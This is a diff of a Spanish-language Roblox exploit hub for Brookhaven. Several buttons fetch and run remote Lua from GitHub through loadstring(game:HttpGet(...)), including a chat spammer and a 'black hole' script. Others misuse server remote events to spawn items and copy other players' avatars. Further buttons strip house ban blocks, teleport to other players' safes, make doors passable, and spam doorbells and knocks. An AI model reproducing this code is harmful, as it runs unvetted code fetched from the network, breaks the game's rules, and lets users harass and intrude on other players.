+AddSong(SongsTb, "Barrio sin ley - Santa Fe Kla", 124214729416657)
+AddSong(SongsTb, "Porque te vas", 134095084857845)
+AddSong(SongsTb, "Mi bello angel", 73469479548185)
+AddSong(SongsTb, "Sneaky Link Remix 2", 110150125036594)
+AddSong(SongsTb, "Arizona", 118954432858043)
+AddSong(SongsTb, "Serrucho", 113032514980007)
+AddSong(SongsTb, "Esclava de oro - El Makabelico", 80089119005067)
+AddSong(SongsTb, "Donde Hubo Fuego - Anuel AA", 132121981590634)
+AddSong(SongsTb, "Tóxicos - Calle 24", 136494478853937)
+
+ScriptsTb:CreateSection("Fly GUI")
+ScriptsTb:CreateButton({
+    Name = "Fly V3",
+    Callback = function()
+        ButtonPSound()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/67Studio/saa/refs/heads/main/Fly"))()
+    end
+})
+
+ScriptsTb:CreateSection("Chat Spammer")
+ScriptsTb:CreateButton({
+    Name = "Irving Spammer",
+    Callback = function()
+        ButtonPSound()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/67Studio/saa/refs/heads/main/Spammer%202"))()
+    end
+})
+
+ScriptsTb:CreateSection("BlackHole")
+ScriptsTb:CreateButton({
+    Name = "Irving Agujero Negro",
+    Callback = function()
+        ButtonPSound()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/67Studio/saa/refs/heads/main/Blahoule"))()
+    end
+})
+
+ScriptsTb:CreateSection("Brookhaven Hubs")
+ScriptsTb:CreateButton({
+    Name = "Dark Hub",
+    Callback = function()
+        ButtonPSound()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Slayerzxz/DarkBrook/refs/heads/main/brookhaven.lua"))()
+    end
+})
+-------------------------------------------------------------------------------
+local TabItems = Window:CreateTab("📦 Items [Nuevo]", 4483362458)
+
+TabItems:CreateButton({
+    Name = "TearGasLauncher",
+    Callback = function()
+        local Event = game:GetService("ReplicatedStorage").RE["1Playe1rTrigge1rEven1t"]
+        Event:FireServer("ToolGiveToServer", game:GetService("Players").LocalPlayer, "TearGasLauncher")
+    end,
+})
+
+TabItems:CreateButton({
+    Name = "SnowballCannon",
+    Callback = function()
+        local Event = game:GetService("ReplicatedStorage").RE["1Playe1rTrigge1rEven1t"]
+        Event:FireServer("ToolGiveToServer", game:GetService("Players").LocalPlayer, "SnowballCannon")
+    end,
+})
+
+TabItems:CreateButton({
+    Name = "WardenPistol",
+    Callback = function()
+        local Event = game:GetService("ReplicatedStorage").RE["1Playe1rTrigge1rEven1t"]
+        Event:FireServer("ToolGiveToServer", game:GetService("Players").LocalPlayer, "WardenPistol")
+    end,
+})
+
+TabItems:CreateButton({
+    Name = "UraniumRod",
+    Callback = function()
+        local Event = game:GetService("ReplicatedStorage").RE["1Playe1rTrigge1rEven1t"]
+        Event:FireServer("ToolGiveToServer", game:GetService("Players").LocalPlayer, "UraniumRod")
+    end,
+})
+
+TabItems:CreateButton({
+    Name = "EggLauncher",
+    Callback = function()
+        local Event = game:GetService("ReplicatedStorage").RE["1Playe1rTrigge1rEven1t"]
+        Event:FireServer("ToolGiveToServer", game:GetService("Players").LocalPlayer, "EggLauncher")
+    end,
+})
+
+TabItems:CreateButton({
+    Name = "Water Ballon",
+    Callback = function()
+        local Event = game:GetService("ReplicatedStorage").RE["1Playe1rTrigge1rEven1t"]
+        Event:FireServer("ToolGiveToServer", game:GetService("Players").LocalPlayer, "Water Ballon")
+    end,
+})
+
+local AvatarTb = Window:CreateTab("👔 Avatar", 4483362458)
+
+AvatarTb:CreateSection("📋 Copiar Avatar de Otro Jugador")
+
+local TargetPlayer = nil
+
+local function GetPlayerNames()
+    local names = {}
+    for _, v in pairs(Players:GetPlayers()) do
+        if v ~= Players.LocalPlayer then
+            table.insert(names, v.Name)
+        end
+    end
+    return names
+end
+
+local PlayerDropdown = AvatarTb:CreateDropdown({
+    Name = "Seleccionar Jugador",
+    Options = GetPlayerNames(),
+    CurrentOption = {""},
+    MultipleOptions = false,
+    Callback = function(Option)
+        ButtonPSound()
+        TargetPlayer = Option[1]
+    end
+})
+
+AvatarTb:CreateButton({
+    Name = "📋 Copiar Avatar",
+    Callback = function()
+        ButtonPSound()
+        if not TargetPlayer or TargetPlayer == "" then
+            Rayfield:Notify({
+                Title = "❌ Error",
+                Content = "Debes seleccionar un jugador primero",
+                Duration = 3
+            })
             return
         end
 
-        hopBtn.Text = "OK"
-        hopBtn.TextColor3 = Color3.fromRGB(100, 230, 160)
-        setHopDot(Color3.fromRGB(80, 230, 130))
-        task.wait(0.3)
+        local TPlr = Players:FindFirstChild(TargetPlayer)
+        local LPlr = Players.LocalPlayer
+        
+        if TPlr and TPlr.Character and LPlr.Character then
+            local THum = TPlr.Character:FindFirstChildOfClass("Humanoid")
+            local LHum = LPlr.Character:FindFirstChildOfClass("Humanoid")
 
-        if not pcall(function()
-            TeleportService:TeleportToPlaceInstance(PlaceId, target, LocalPlayer)
-        end) then
-            hopBtn.Text = "ERROR"
-            hopBtn.TextColor3 = Color3.fromRGB(255, 100, 100)
-            setHopDot(Color3.fromRGB(255, 80, 80))
-            task.wait(2)
-            hopBtn.Text = "ON"
-            hopBtn.TextColor3 = Color3.fromRGB(120, 200, 255)
-            setHopDot(Color3.fromRGB(180, 180, 180))
-        end
-        hopBtn.Active = true
-    end)
+            if THum and LHum then
+                local PDesc = THum:GetAppliedDescription()
+                
+                local argsBody = {
+                    [1] = {
+                        [1] = PDesc.Torso,
+                        [2] = PDesc.RightArm,
+                        [3] = PDesc.LeftArm,
+                        [4] = PDesc.RightLeg,
+                        [5] = PDesc.LeftLeg,
+                        [6] = PDesc.Head
+                    }
+                }
+                Remotes.ChangeCharacterBody:InvokeServer(unpack(argsBody))
+                task.wait(0.3)
 
-    -- ---------- PANEL DE CONFIGURACIÓN ----------
-    local settingsPanel = Instance.new("Frame")
-    settingsPanel.Size = UDim2.new(0, 240, 0, 200)
-    settingsPanel.Position = UDim2.new(0.5, -120, 0.5, -100)
-    settingsPanel.BackgroundColor3 = Color3.fromRGB(15, 17, 23)
-    settingsPanel.BackgroundTransparency = 0.05
-    settingsPanel.BorderSizePixel = 0
-    settingsPanel.ZIndex = 50
-    settingsPanel.Visible = false
-    settingsPanel.Parent = gui
+                if tonumber(PDesc.Shirt) then
+                    Remotes.Wear:InvokeServer(tonumber(PDesc.Shirt))
+                    task.wait(0.2)
+                end
+                if tonumber(PDesc.Pants) then
+                    Remotes.Wear:InvokeServer(tonumber(PDesc.Pants))
+                    task.wait(0.2)
+                end
+                if tonumber(PDesc.Face) then
+                    Remotes.Wear:InvokeServer(tonumber(PDesc.Face))
+                    task.wait(0.2)
+                end
+                
+                for _, v in ipairs(PDesc:GetAccessories(true)) do
+                    if v.AssetId then
+                        Remotes.Wear:InvokeServer(tonumber(v.AssetId))
+                        task.wait(0.1)
+                    end
+                end
+                
+                local SkinColor = TPlr.Character:FindFirstChild("Body Colors")
+                if SkinColor then
+                    Remotes.ChangeBodyColor:FireServer(tostring(SkinColor.HeadColor))
+                end
 
-    local setPCorner = Instance.new("UICorner")
-    setPCorner.CornerRadius = UDim.new(0, 14)
-    setPCorner.Parent = settingsPanel
-
-    local setPStroke = Instance.new("UIStroke")
-    setPStroke.Color = Color3.fromRGB(60, 140, 255)
-    setPStroke.Thickness = 1.5
-    setPStroke.Transparency = 0.2
-    setPStroke.Parent = settingsPanel
-
-    local setPTitle = Instance.new("TextLabel")
-    setPTitle.Size = UDim2.new(1, 0, 0, 24)
-    setPTitle.Position = UDim2.new(0, 0, 0, 8)
-    setPTitle.BackgroundTransparency = 1
-    setPTitle.Text = "⚙ Configuración"
-    setPTitle.TextColor3 = Color3.fromRGB(240, 244, 255)
-    setPTitle.Font = Enum.Font.GothamBold
-    setPTitle.TextSize = 14
-    setPTitle.ZIndex = 51
-    setPTitle.Parent = settingsPanel
-
-    local setPScaleLabel = Instance.new("TextLabel")
-    setPScaleLabel.Size = UDim2.new(1, -24, 0, 16)
-    setPScaleLabel.Position = UDim2.new(0, 12, 0, 38)
-    setPScaleLabel.BackgroundTransparency = 1
-    setPScaleLabel.Text = "Tamaño de interfaz"
-    setPScaleLabel.TextColor3 = Color3.fromRGB(140, 180, 255)
-    setPScaleLabel.Font = Enum.Font.GothamBold
-    setPScaleLabel.TextSize = 11
-    setPScaleLabel.TextXAlignment = Enum.TextXAlignment.Left
-    setPScaleLabel.ZIndex = 51
-    setPScaleLabel.Parent = settingsPanel
-
-    local sliderBg = Instance.new("Frame")
-    sliderBg.Size = UDim2.new(1, -24, 0, 8)
-    sliderBg.Position = UDim2.new(0, 12, 0, 58)
-    sliderBg.BackgroundColor3 = Color3.fromRGB(30, 35, 48)
-    sliderBg.BorderSizePixel = 0
-    sliderBg.ZIndex = 51
-    sliderBg.Parent = settingsPanel
-
-    local sbgCorner = Instance.new("UICorner")
-    sbgCorner.CornerRadius = UDim.new(1, 0)
-    sbgCorner.Parent = sliderBg
-
-    local sliderFill = Instance.new("Frame")
-    sliderFill.BackgroundColor3 = Color3.fromRGB(60, 140, 255)
-    sliderFill.BorderSizePixel = 0
-    sliderFill.ZIndex = 52
-    sliderFill.Parent = sliderBg
-
-    local sfCorner = Instance.new("UICorner")
-    sfCorner.CornerRadius = UDim.new(1, 0)
-    sfCorner.Parent = sliderFill
-
-    local sliderKnob = Instance.new("Frame")
-    sliderKnob.Size = UDim2.new(0, 14, 0, 14)
-    sliderKnob.BackgroundColor3 = Color3.fromRGB(240, 244, 255)
-    sliderKnob.BorderSizePixel = 0
-    sliderKnob.ZIndex = 53
-    sliderKnob.Parent = sliderBg
-
-    local skCorner = Instance.new("UICorner")
-    skCorner.CornerRadius = UDim.new(1, 0)
-    skCorner.Parent = sliderKnob
-
-    local scaleValueLabel = Instance.new("TextLabel")
-    scaleValueLabel.Size = UDim2.new(0, 40, 0, 14)
-    scaleValueLabel.Position = UDim2.new(1, -52, 0, 38)
-    scaleValueLabel.BackgroundTransparency = 1
-    scaleValueLabel.Text = "100%"
-    scaleValueLabel.TextColor3 = Color3.fromRGB(240, 244, 255)
-    scaleValueLabel.Font = Enum.Font.GothamBold
-    scaleValueLabel.TextSize = 11
-    scaleValueLabel.TextXAlignment = Enum.TextXAlignment.Right
-    scaleValueLabel.ZIndex = 51
-    scaleValueLabel.Parent = settingsPanel
-
-    local function applyScale(ratio, save)
-        local r = math.clamp(ratio, 0, 1)
-        local scale = CONFIG.MinScale + (CONFIG.MaxScale - CONFIG.MinScale) * r
-        uiScale.Scale = scale
-        sliderFill.Size = UDim2.new(r, 0, 1, 0)
-        sliderKnob.Position = UDim2.new(r, -7, 0.5, -7)
-        scaleValueLabel.Text = tostring(math.floor(scale * 100 + 0.5)) .. "%"
-        if save then saveScale(scale) end
-    end
-
-    local curScale = uiScale.Scale
-    local curRatio = math.clamp((curScale - CONFIG.MinScale) / (CONFIG.MaxScale - CONFIG.MinScale), 0, 1)
-    sliderFill.Size = UDim2.new(curRatio, 0, 1, 0)
-    sliderKnob.Position = UDim2.new(curRatio, -7, 0.5, -7)
-    scaleValueLabel.Text = tostring(math.floor(uiScale.Scale * 100 + 0.5)) .. "%"
-
-    sliderBg.InputBegan:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-            local function update(save)
-                local r = (UserInputService:GetMouseLocation().X - sliderBg.AbsolutePosition.X) / sliderBg.AbsoluteSize.X
-                applyScale(r, save)
+                Rayfield:Notify({
+                    Title = "✅ Avatar Copiado",
+                    Content = "Avatar de " .. TargetPlayer .. " copiado exitosamente",
+                    Duration = 3
+                })
+            else
+                Rayfield:Notify({
+                    Title = "❌ Error",
+                    Content = "El jugador no tiene un personaje válido",
+                    Duration = 3
+                })
             end
-            update(false)
-            local c1 = UserInputService.InputChanged:Connect(function(i)
-                if i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch then
-                    update(false)
-                end
-            end)
-            local c2
-            c2 = UserInputService.InputEnded:Connect(function(i)
-                if i == input then
-                    update(true)
-                    c1:Disconnect()
-                    c2:Disconnect()
-                end
-            end)
+        else
+            Rayfield:Notify({
+                Title = "❌ Error",
+                Content = "Jugador no encontrado o sin personaje",
+                Duration = 3
+            })
         end
-    end)
+    end
+})
 
-    -- Banner
-    local banner = Instance.new("Frame")
-    banner.Size = UDim2.new(1, -24, 0, 24)
-    banner.Position = UDim2.new(0, 12, 0, 78)
-    banner.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-    banner.BorderSizePixel = 0
-    banner.ZIndex = 51
-    banner.Parent = settingsPanel
+AvatarTb:CreateButton({
+    Name = "🔄 Actualizar Lista de Jugadores",
+    Callback = function()
+        ButtonPSound()
+        PlayerDropdown:Refresh(GetPlayerNames(), true)
+    end
+})
 
-    local bannerCorner = Instance.new("UICorner")
-    bannerCorner.CornerRadius = UDim.new(0, 8)
-    bannerCorner.Parent = banner
+AvatarTb:CreateSection("🎀 Paquetes de Cuerpo")
 
-    local bannerText = Instance.new("TextLabel")
-    bannerText.Size = UDim2.new(1, 0, 1, 0)
-    bannerText.BackgroundTransparency = 1
-    bannerText.Text = "Nexus Hub pronto V2 🐣"
-    bannerText.TextColor3 = Color3.fromRGB(0, 0, 0)
-    bannerText.Font = Enum.Font.GothamBold
-    bannerText.TextSize = 13
-    bannerText.ZIndex = 52
-    bannerText.Parent = banner
-
-    local bannerGrad = Instance.new("UIGradient")
-    bannerGrad.Color = ColorSequence.new({
-        ColorSequenceKeypoint.new(0,    Color3.fromRGB(0, 0, 0)),
-        ColorSequenceKeypoint.new(0.45, Color3.fromRGB(0, 0, 0)),
-        ColorSequenceKeypoint.new(0.5,  Color3.fromRGB(150, 150, 150)),
-        ColorSequenceKeypoint.new(0.55, Color3.fromRGB(0, 0, 0)),
-        ColorSequenceKeypoint.new(1,    Color3.fromRGB(0, 0, 0)),
+local function ApplyBodyBundle(ids)
+    for _, id in ipairs(ids) do
+        pcall(function()
+            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Wear"):InvokeServer(id)
+        end)
+        task.wait(0.3)
+    end
+    Rayfield:Notify({
+        Title = "✅ Aplicado",
+        Content = "Paquete de cuerpo aplicado",
+        Duration = 2
     })
-    bannerGrad.Offset = Vector2.new(-1, 0)
-    bannerGrad.Parent = bannerText
+end
 
-    task.spawn(function()
-        while gui.Parent do
-            bannerGrad.Offset = Vector2.new(-1, 0)
-            TweenService:Create(bannerGrad, TweenInfo.new(2.5, Enum.EasingStyle.Linear), {
-                Offset = Vector2.new(1, 0)
-            }):Play()
-            task.wait(3)
+AvatarTb:CreateButton({
+    Name = "🎀 Viral Girl Body",
+    Callback = function()
+        ButtonPSound()
+        ApplyBodyBundle({
+            18839824113,
+            18839824209,
+            18839824132,
+            127241951574732,
+            118303475394830
+        })
+    end
+})
+
+AvatarTb:CreateButton({
+    Name = "🖤 Tall Emo Body",
+    Callback = function()
+        ButtonPSound()
+        ApplyBodyBundle({
+            15365110905,
+            15365110924,
+            15365110917,
+            96815508293389,
+            121515016872144
+        })
+    end
+})
+
+AvatarTb:CreateButton({
+    Name = "👗 Zepeto Girl Body",
+    Callback = function()
+        ButtonPSound()
+        ApplyBodyBundle({
+            115745153758680,
+            18839824209,
+            18839824132,
+            70582373853805,
+            70380761114055
+        })
+    end
+})
+
+AvatarTb:CreateButton({
+    Name = "👔 Zepeto Boy Body",
+    Callback = function()
+        ButtonPSound()
+        ApplyBodyBundle({
+            127731857442064,
+            116852226852049,
+            18839824132,
+            70582373853805,
+            70380761114055
+        })
+    end
+})
+
+AvatarTb:CreateSection("🦵 Modificadores de Avatar")
+
+local function ApplyBodyMod(useKorblox, useHeadless)
+    local p = game:GetService("Players").LocalPlayer
+    local hum = p.Character and p.Character:FindFirstChildOfClass("Humanoid")
+    
+    if hum then
+        local desc = hum:GetAppliedDescription()
+        local args = {
+            [1] = {
+                [1] = desc.Torso,
+                [2] = desc.RightArm,
+                [3] = desc.LeftArm,
+                [4] = useKorblox and 139607718 or desc.RightLeg,
+                [5] = desc.LeftLeg,
+                [6] = useHeadless and 134082579 or desc.Head
+            }
+        }
+        game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(unpack(args))
+    end
+end
+
+AvatarTb:CreateButton({
+    Name = "🦵 Korblox (Pierna Izquierda)",
+    Callback = function()
+        ButtonPSound()
+        ApplyBodyMod(true, false)
+        Rayfield:Notify({
+            Title = "✅ Aplicado",
+            Content = "Korblox aplicado",
+            Duration = 2
+        })
+    end
+})
+
+AvatarTb:CreateButton({
+    Name = "💀 Headless (Cabeza)",
+    Callback = function()
+        ButtonPSound()
+        ApplyBodyMod(false, true)
+        Rayfield:Notify({
+            Title = "✅ Aplicado",
+            Content = "Headless aplicado",
+            Duration = 2
+        })
+    end
+})
+
+AvatarTb:CreateSection("✨ Accesorios y Auras")
+
+local function AddAvatarItem(itemID, notifyTitle)
+    local args = {[1] = itemID}
+    pcall(function()
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Wear"):InvokeServer(unpack(args))
+    end)
+    Rayfield:Notify({
+        Title = "✅ Aplicado",
+        Content = notifyTitle .. " añadido",
+        Duration = 2
+    })
+end
+
+local accesorios = {
+    {"🛸 UFO", 8151404994},
+    {"🪓 Hacha", 3240543366},
+    {"☠️ Aura Calavera", 14524326503},
+    {"👑 Corona Real", 10159600649},
+    {"🔫 Pistola Sci-Fi", 3013849063},
+    {"👑 Corona Azul", 13632274891},
+    {"👑 Corona Roja", 13634032867},
+    {"👑 Corona Amarilla", 13632296794},
+    {"🌈 Corona Arcoíris", 13634162618},
+    {"🎧 Sombrero con Sonido", 305888394},
+    {"🐔 Sombrero Pollo con Sonido", 24112667},
+    {"🟪 Sombrero Morado con Sonido", 24114402},
+    {"🎹 Sombrero con Sonido", 33070696}
+}
+
+for _, acc in ipairs(accesorios) do
+    AvatarTb:CreateButton({
+        Name = acc[1],
+        Callback = function()
+            ButtonPSound()
+            AddAvatarItem(acc[2], acc[1])
         end
+    })
+end
+
+AvatarTb:CreateSection("🎭 Animaciones")
+
+local function ApplyAnimation(id, name)
+    local args = {[1] = id}
+    pcall(function()
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Wear"):InvokeServer(unpack(args))
     end)
+    Rayfield:Notify({
+        Title = "✅ Animación Aplicada",
+        Content = name .. " activada",
+        Duration = 2
+    })
+end
 
-    -- Botón comentarios
-    local commentBtn = Instance.new("TextButton")
-    commentBtn.Size = UDim2.new(1, -24, 0, 26)
-    commentBtn.Position = UDim2.new(0, 12, 0, 108)
-    commentBtn.BackgroundColor3 = Color3.fromRGB(30, 40, 55)
-    commentBtn.Text = "💬 Déjanos tu comentario o qué te gustaría agregar"
-    commentBtn.TextColor3 = Color3.fromRGB(180, 200, 230)
-    commentBtn.Font = Enum.Font.GothamBold
-    commentBtn.TextSize = 9
-    commentBtn.AutoButtonColor = false
-    commentBtn.ZIndex = 51
-    commentBtn.Parent = settingsPanel
+local AnimData = {
+    Idle = {
+        {"Adidas Stand", 126354114956642},
+        {"Wicked Popular Idle", 101839542383818},
+        {"Stylish Idle", 619511648},
+        {"Levitation Idle", 619542203},
+        {"Realistic Idle", 11600321661},
+        {"Catwalk Glam Idle", 101279640971758}
+    },
+    Walk = {
+        {"Adidas Walking", 106810508343012},
+        {"Wicked Popular Walk", 133304526526319},
+        {"Stylish Walk", 619511648},
+        {"Realistic Walk", 11600321661},
+        {"Adidas Sport Walk", 18538146480}
+    },
+    Run = {
+        {"Adidas Running", 124765145869332},
+        {"Wicked Popular Run", 136276875045281},
+        {"Fast Realistic Run", 11600321661},
+        {"Adidas Sport Run", 18538133604}
+    },
+    Jump = {
+        {"Adidas Jump", 115715495289805},
+        {"Wicked Popular Jump", 130373407996664},
+        {"Adidas Sport Jump", 18538153691}
+    },
+    Fall = {
+        {"Adidas Fall", 93993406355955},
+        {"Wicked Popular Fall", 83937116921114},
+        {"Adidas Sport Fall", 18538164337}
+    },
+    Swim = {
+        {"Adidas Swim", 106537993816942},
+        {"Wicked Popular Swim", 128475661806875},
+        {"Adidas Sport Swim", 18538158932}
+    },
+    Climb = {
+        {"Adidas Climb", 123695349157584},
+        {"Wicked Popular Climb", 135810009801094},
+        {"Adidas Sport Climb", 18538170170}
+    }
+}
 
-    local cbCorner = Instance.new("UICorner")
-    cbCorner.CornerRadius = UDim.new(0, 8)
-    cbCorner.Parent = commentBtn
+for category, animations in pairs(AnimData) do
+    local options = {}
+    for _, anim in ipairs(animations) do
+        table.insert(options, anim[1])
+    end
+    
+    AvatarTb:CreateDropdown({
+        Name = category .. " Animation",
+        Options = options,
+        CurrentOption = options[1] or "",
+        Callback = function(Option)
+            ButtonPSound()
+            local selectedName = type(Option) == "table" and Option[1] or Option
+            for _, anim in ipairs(animations) do
+                if anim[1] == selectedName then
+                    ApplyAnimation(anim[2], selectedName)
+                    break
+                end
+            end
+        end
+    })
+end
 
-    commentBtn.MouseEnter:Connect(function()
-        TweenService:Create(commentBtn, TweenInfo.new(0.15), { BackgroundColor3 = Color3.fromRGB(45, 55, 75) }):Play()
-    end)
-    commentBtn.MouseLeave:Connect(function()
-        TweenService:Create(commentBtn, TweenInfo.new(0.15), { BackgroundColor3 = Color3.fromRGB(30, 40, 55) }):Play()
-    end)
-    commentBtn.MouseButton1Click:Connect(function()
-        if setclipboard then setclipboard("Nexus Hub") end
-    end)
+local CasaTab = Window:CreateTab("🏠 Casa", 4483362458)
 
-    -- Botón cerrar
-    local closeBtn = Instance.new("TextButton")
-    closeBtn.Size = UDim2.new(1, -24, 0, 26)
-    closeBtn.Position = UDim2.new(0, 12, 0, 142)
-    closeBtn.BackgroundColor3 = Color3.fromRGB(30, 40, 55)
-    closeBtn.Text = "Cerrar"
-    closeBtn.TextColor3 = Color3.fromRGB(180, 200, 230)
-    closeBtn.Font = Enum.Font.GothamBold
-    closeBtn.TextSize = 11
-    closeBtn.AutoButtonColor = false
-    closeBtn.ZIndex = 51
-    closeBtn.Parent = settingsPanel
+CasaTab:CreateSection("🌈 RGB")
 
-    local clCorner = Instance.new("UICorner")
-    clCorner.CornerRadius = UDim.new(0, 8)
-    clCorner.Parent = closeBtn
+local houseRgb = false
 
-    closeBtn.MouseButton1Click:Connect(function()
-        settingsPanel.Visible = false
-    end)
+CasaTab:CreateToggle({
+    Name = "🌈 Casa RGB",
+    CurrentValue = false,
+    Callback = function(Value)
+        ButtonPSound()
+        houseRgb = Value
+        if houseRgb then
+            task.spawn(function()
+                while houseRgb do
+                    local smoothColor = Color3.fromHSV(hueValue, 1, 1)
+                    pcall(function()
+                        HouseRemote:FireServer("ColorPickHouse", smoothColor)
+                    end)
+                    task.wait(1.1)
+                end
+            end)
+        end
+    end
+})
 
-    settingsBtn.MouseButton1Click:Connect(function()
-        settingsPanel.Visible = not settingsPanel.Visible
+CasaTab:CreateSection("🏠 Utilidades de Casas")
+
+local function getHouseList()
+    local Tabela = {}
+    local lots = workspace:FindFirstChild("001_Lots")
+    if lots then
+        for _, House in ipairs(lots:GetChildren()) do
+            if House.Name ~= "For Sale" and House:IsA("Model") then
+                table.insert(Tabela, House.Name)
+            end
+        end
+    end
+    return Tabela
+end
+
+local SelectHouse = nil
+local houseDropdown = nil
+
+houseDropdown = CasaTab:CreateDropdown({
+    Name = "Seleccionar Casa",
+    Options = getHouseList(),
+    CurrentOption = {""},
+    MultipleOptions = false,
+    Callback = function(Option)
+        ButtonPSound()
+        SelectHouse = Option[1]
+    end
+})
+
+
+CasaTab:CreateButton({
+    Name = "🔓 Desbanear Casas",
+    Callback = function()
+        ButtonPSound()
+        local lots = workspace:FindFirstChild("001_Lots")
+
+        if not lots then
+            Rayfield:Notify({
+                Title = "❌ Error",
+                Content = "001_Lots no existe",
+                Duration = 3,
+                Image = 4483362458,
+            })
+            return
+        end
+
+        local count = 0
+
+        for _, lot in ipairs(lots:GetChildren()) do
+            local picked = lot:FindFirstChild("HousePickedByPlayer")
+
+            if picked then
+                local house = picked:FindFirstChild("HouseModel")
+
+                if house then
+                    local banned = house:FindFirstChild("BannedBlock")
+
+                    if banned then
+                        banned:Destroy()
+                        count = count + 1
+                    end
+                end
+            end
+        end
+
+        if count > 0 then
+            Rayfield:Notify({
+                Title = "✅ Desbaneo Completado",
+                Content = count .. " casas desbaneadas",
+                Duration = 3,
+                Image = 4483362458,
+            })
+        else
+            Rayfield:Notify({
+                Title = "❌ Error",
+                Content = "No se encontraron casas baneadas",
+                Duration = 3,
+                Image = 4483362458,
+            })
+        end
+    end
+})
+
+CasaTab:CreateButton({
+    Name = "🔄 Actualizar Lista",
+    Callback = function()
+        ButtonPSound()
+        local houses = getHouseList()
+        if houseDropdown then
+            houseDropdown:Refresh(houses, true)
+            Rayfield:Notify({
+                Title = "🔄 Actualizado",
+                Duration = 2,
+                Image = 4483362458,
+            })
+        end
+    end
+})
+
+CasaTab:CreateButton({
+    Name = "📌 TP a Casa",
+    Callback = function()
+        ButtonPSound()
+        if not SelectHouse or SelectHouse == "" then
+            Rayfield:Notify({
+                Title = "❌ Error",
+                Duration = 3,
+                Image = 4483362458,
+            })
+            return
+        end
+        
+        local House = workspace["001_Lots"]:FindFirstChild(tostring(SelectHouse))
+        if House and game.Players.LocalPlayer.Character then
+            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(House.WorldPivot.Position)
+            Rayfield:Notify({
+                Title = "📌 Teletransportado",
+                Duration = 2,
+                Image = 4483362458,
+            })
+        else
+            Rayfield:Notify({
+                Title = "❌ Error",
+                Duration = 2,
+                Image = 4483362458,
+            })
+        end
+    end
+})
+
+CasaTab:CreateButton({
+    Name = "💰 TP al Cofre",
+    Callback = function()
+        ButtonPSound()
+        if not SelectHouse or SelectHouse == "" then
+            Rayfield:Notify({
+                Title = "❌ Error",
+                Duration = 3,
+                Image = 4483362458,
+            })
+            return
+        end
+        
+        local House = workspace["001_Lots"]:FindFirstChild(tostring(SelectHouse))
+        if House and House:FindFirstChild("HousePickedByPlayer") and game.Players.LocalPlayer.Character then
+            local safe = House.HousePickedByPlayer.HouseModel:FindFirstChild("001_Safe")
+            if safe then
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(safe.WorldPivot.Position)
+                Rayfield:Notify({
+                    Title = "💰 Teletransportado",
+                    Duration = 2,
+                    Image = 4483362458,
+                })
+            else
+                Rayfield:Notify({
+                    Title = "❌ Error",
+                    Duration = 2,
+                    Image = 4483362458,
+                })
+            end
+        else
+            Rayfield:Notify({
+                Title = "❌ Error",
+                Duration = 2,
+                Image = 4483362458,
+            })
+        end
+    end
+})
+
+CasaTab:CreateToggle({
+    Name = "🚪 Atravesar Puertas",
+    CurrentValue = false,
+    Callback = function(Value)
+        ButtonPSound()
+        if not SelectHouse or SelectHouse == "" then
+            Rayfield:Notify({
+                Title = "❌ Error",
+                Duration = 3,
+                Image = 4483362458,
+            })
+            return false
+        end
+        
+        pcall(function()
+            local House = workspace["001_Lots"]:FindFirstChild(tostring(SelectHouse))
+            if House and House:FindFirstChild("HousePickedByPlayer") then
+                local housepickedbyplayer = House.HousePickedByPlayer
+                local doors = housepickedbyplayer.HouseModel:FindFirstChild("001_HouseDoors")
+                if doors and doors:FindFirstChild("HouseDoorFront") then
+                    for _, Base in ipairs(doors.HouseDoorFront:GetChildren()) do
+                        if Base:IsA("BasePart") then
+                            Base.CanCollide = not Value
+                        end
+                    end
+                end
+            end
+        end)
+        
+        Rayfield:Notify({
+            Title = "🚪 Puertas",
+            Duration = 2,
+            Image = 4483362458,
+        })
+    end
+})
+
+CasaTab:CreateToggle({
+    Name = "🔔 Campanilla Auto",
+    CurrentValue = false,
+    Callback = function(Value)
+        ButtonPSound()
+        if not SelectHouse or SelectHouse == "" then
+            Rayfield:Notify({
+                Title = "❌ Error",
+                Duration = 3,
+                Image = 4483362458,
+            })
+            return false
+        end
+        
+        getgenv().ChaosHubAutoSpawnDoorbellValue = Value
+        task.spawn(function()
+            while getgenv().ChaosHubAutoSpawnDoorbellValue do
+                pcall(function()
+                    local House = workspace["001_Lots"]:FindFirstChild(tostring(SelectHouse))
+                    if House and House:FindFirstChild("HousePickedByPlayer") then
+                        local doorbell = House.HousePickedByPlayer.HouseModel:FindFirstChild("001_DoorBell")
+                        if doorbell and doorbell:FindFirstChild("TouchBell") then
+                            fireclickdetector(doorbell.TouchBell.ClickDetector)
+                        end
+                    end
+                end)
+                task.wait(0.5)
+            end
+        end)
+        
+        Rayfield:Notify({
+            Title = "🔔 Campanilla",
+            Duration = 2,
+            Image = 4483362458,
+        })
+    end
+})
+
+CasaTab:CreateToggle({
+    Name = "🚪 Knock Auto",
+    CurrentValue = false,
+    Callback = function(Value)
+        ButtonPSound()
+        if not SelectHouse or SelectHouse == "" then
+            Rayfield:Notify({
+                Title = "❌ Error",
+                Duration = 3,
+                Image = 4483362458,
+            })
+            return false
+        end
+        
+        getgenv().ChaosHubAutoSpawnDoorValue = Value
+        task.spawn(function()
+            while getgenv().ChaosHubAutoSpawnDoorValue do
+                pcall(function()
+                    local House = workspace["001_Lots"]:FindFirstChild(tostring(SelectHouse))
+                    if House and House:FindFirstChild("HousePickedByPlayer") then
+                        local doors = House.HousePickedByPlayer.HouseModel:FindFirstChild("001_HouseDoors")
+                        if doors and doors:FindFirstChild("HouseDoorFront") and doors.HouseDoorFront:FindFirstChild("Knock") then
+                            fireclickdetector(doors.HouseDoorFront.Knock.TouchBell.ClickDetector)
+                        end
+                    end
+                end)
+                task.wait(0.5)
+            end
+        end)
+        
+        Rayfield:Notify({
+            Title = "🚪 Knock",
+            Duration = 2,
+            Image = 4483362458,
+        })
+    end
+})
+
